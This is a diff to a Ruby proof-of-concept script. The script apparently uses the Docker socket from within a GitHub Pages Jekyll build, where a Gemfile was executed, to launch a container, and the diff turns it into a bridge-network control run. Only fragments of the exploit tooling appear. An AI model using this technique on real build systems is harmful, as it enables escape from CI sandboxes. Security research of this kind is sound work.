@@ -5,7 +5,7 @@ require "json"
 require "securerandom"
 require "socket"
 
-PROOF = File.join(__dir__, "c217-internal-proof.html")
+PROOF = File.join(__dir__, "c217-internal-bridge-control.html")
 SOCK = "/var/run/docker.sock"
 IMAGE = "ghcr.io/actions/jekyll-build-pages:v1.0.13"
 
@@ -78,7 +78,7 @@ child = <<~'RUBY'
   puts JSON.generate(result)
 RUBY
 
-name = "c217-internal-#{SecureRandom.hex(5)}"
+name = "c217-internal-bridge-#{SecureRandom.hex(5)}"
 container_id = nil
 proof = {
   "gemfile_executed" => true,
@@ -94,7 +94,7 @@ begin
     "Entrypoint" => ["/usr/local/bin/ruby", "-e"],
     "Cmd" => [child],
     "Tty" => true,
-    "HostConfig" => {"NetworkMode" => "host"},
+    "HostConfig" => {},
   }
   create_status, create_body = docker_req("POST", "/v1.41/containers/create?name=#{name}", config)
   parsed = JSON.parse(create_body) rescue {}
